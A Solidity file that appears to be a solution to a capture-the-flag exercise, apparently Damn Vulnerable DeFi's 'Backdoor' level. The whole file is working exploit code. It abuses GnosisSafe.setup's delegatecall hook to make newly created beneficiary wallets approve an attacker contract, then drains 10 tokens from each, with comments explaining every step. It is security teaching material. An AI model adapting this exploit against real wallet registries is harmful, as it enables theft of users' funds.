// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "solady/src/auth/Ownable.sol";
import "solady/src/utils/SafeTransferLib.sol";
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "@gnosis.pm/safe-contracts/contracts/GnosisSafe.sol";
import "@gnosis.pm/safe-contracts/contracts/proxies/IProxyCreationCallback.sol";
// @audit additional import
import "@gnosis.pm/safe-contracts/contracts/proxies/GnosisSafeProxyFactory.sol";
import "./WalletRegistry.sol";

contract DelegateCallbackAttack {
    function delegateCallback(address token, address spender, uint256 drainAmount) external {
        IERC20(token).approve(spender, drainAmount);
    }
}


contract WalletRegistryAttack {
    uint256 immutable DRAIN_AMOUNT = 10 ether;

    // attack execute in constructor to pass 1 transaction requirement
    constructor(address[] memory _initialBeneficiaries,
                address          _walletRegistry ) {

        DelegateCallbackAttack delegateCallback = new DelegateCallbackAttack();
        WalletRegistry walletRegistry       = WalletRegistry(_walletRegistry);
        GnosisSafeProxyFactory proxyFactory = GnosisSafeProxyFactory(walletRegistry.walletFactory());
        IERC20 token                        = walletRegistry.token();

        for (uint8 i = 0; i < _initialBeneficiaries.length;) {       
            // corresponds to GnosisSafe.setup(address[] calldata _owners) - the owners of this
            // safe, in our case each safe will have one owner, the beneficiary.
            //address[1] memory owners = [_initialBeneficiaries[i]];
            address[] memory owners = new address[](1);
            owners[0] = _initialBeneficiaries[i];

            // corresponds to GnosisSafeProxyFactory.createProxyWithCallback(..,bytes memory initializer,..)
            // has function selector = GnosisSafe.setup.selector
            // and parameters corresponding to GnosisSafe.setup()
            bytes memory initializer = abi.encodeWithSelector(
                GnosisSafe.setup.selector, // function selector = GnosisSafe.setup.selector
                owners,                    // 1 safe owner; the beneficiary
                1,                         // 1 confirmation required for a safe transaction
                address(delegateCallback), // delegatecall() from new GnosisSafeProxy into attack contract
                                           // function selector of delegatecall attack function + params
                abi.encodeWithSelector(DelegateCallbackAttack.delegateCallback.selector, 
                                       address(token), address(this), DRAIN_AMOUNT),
                address(0),                // no fallbackHandler
                address(0),                // no paymentToken
                0,                         // no payment
                address(0)                 // no paymentReceiver
            );

            // Next using our payload, create the wallet (proxy) for each beneficiary. 
            // This should have been done as part of the initial GnosisSafe setup, 
            // this not being done is what allows us to do it and exploit the contract
            GnosisSafeProxy safeProxy = proxyFactory.createProxyWithCallback(
                walletRegistry.masterCopy(), 
                initializer, 
                i, // nonce used to generate salt to calculate address of new proxy contract
                // callback to WalletRegistry.proxyCreated() after new proxy deployed & initialized
                IProxyCreationCallback(_walletRegistry) 
            );

            // At this point the GnosisSafeFactory has deployed & initialized the new GnosisSafeProxy,
            // and has used delegatecall() to execute callback function & call DVT.approve() with GnosisSafeProxy context,
            // making our attack contract an the approved spender. All that is left to do is directly
            // call DVT.transferFrom() with new proxy address to drain wallet
            require(token.allowance(address(safeProxy), address(this)) == DRAIN_AMOUNT);
            token.transferFrom(address(safeProxy), msg.sender, DRAIN_AMOUNT);

            unchecked{++i;}
        }
    }
}